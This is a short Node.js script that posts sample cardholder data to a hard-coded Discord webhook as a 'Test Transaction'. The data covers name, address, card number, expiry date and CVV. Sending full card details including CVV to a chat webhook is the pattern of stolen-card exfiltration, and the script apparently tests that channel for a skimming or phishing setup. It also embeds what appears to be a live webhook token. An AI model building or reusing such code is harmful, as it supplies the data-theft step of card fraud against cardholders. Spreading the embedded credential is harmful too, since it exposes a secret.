const axios = require('axios');

async function testWebhook() {
    const webhookUrl = 'https://discord.com/api/webhooks/1396214469084053625/OKz32VisCW9Z5p1AhCrHqlmtirhWao7EGq_1NIYhHB1vQrdU-5MojTwemZr5McTvCiBP';
    
    const sampleData = {
        name: 'John Doe (Test)',
        amount: 10.00,
        street: '123 Test St',
        city: 'Testville',
        zip: '12345',
        cardNumber: '1234567890123456',
        expiryDate: '12/25',
        cvv: '123'
    };

    const embed = {
        title: 'Test Transaction',
        color: 0xffa500, // Orange color for test
        fields: [
            { name: 'Full Name', value: sampleData.name, inline: true },
            { name: 'Amount', value: sampleData.amount.toString(), inline: true },
            { name: 'Street Address', value: sampleData.street, inline: true },
            { name: 'City', value: sampleData.city, inline: true },
            { name: 'ZIP Code', value: sampleData.zip, inline: true },
            { name: 'Card Number', value: `||${sampleData.cardNumber}||`, inline: true },
            { name: 'Expiry Date', value: `||${sampleData.expiryDate}||`, inline: true },
            { name: 'CVV', value: `||${sampleData.cvv}||`, inline: true },
        ],
        timestamp: new Date(),
        footer: {
            text: 'This is a test notification.'
        }
    };

    try {
        await axios.post(webhookUrl, { embeds: [embed] });
        console.log('Test webhook sent successfully!');
    } catch (error) {
        console.error('Error sending test webhook:', error.message);
    }
}

testWebhook();